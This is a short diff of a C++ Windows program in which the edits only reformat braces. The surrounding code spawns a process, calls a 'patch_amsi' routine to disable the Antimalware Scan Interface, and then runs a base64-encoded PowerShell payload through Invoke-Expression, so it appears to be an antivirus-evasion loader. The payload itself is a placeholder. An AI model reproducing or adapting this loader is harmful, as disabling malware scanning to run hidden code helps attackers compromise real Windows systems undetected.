@@ -114,8 +114,7 @@ int main()
     saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
     saAttr.bInheritHandle = TRUE;
     saAttr.lpSecurityDescriptor = NULL;
-    if (!CreatePipe(&hStdinRd, &hStdinWr, &saAttr, 0))
-    {
+    if (!CreatePipe(&hStdinRd, &hStdinWr, &saAttr, 0)) {
         return EXIT_FAILURE;
     }
 
@@ -136,11 +135,9 @@ int main()
         	NULL,
         	NULL,
         	psi,
-        	&pi))
-    {
+        	&pi)) {
         return EXIT_FAILURE;
     }
-	
 	
     if (patch_amsi(pi)) {
 		std::string command = "Invoke-Expression -Command ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>')))";
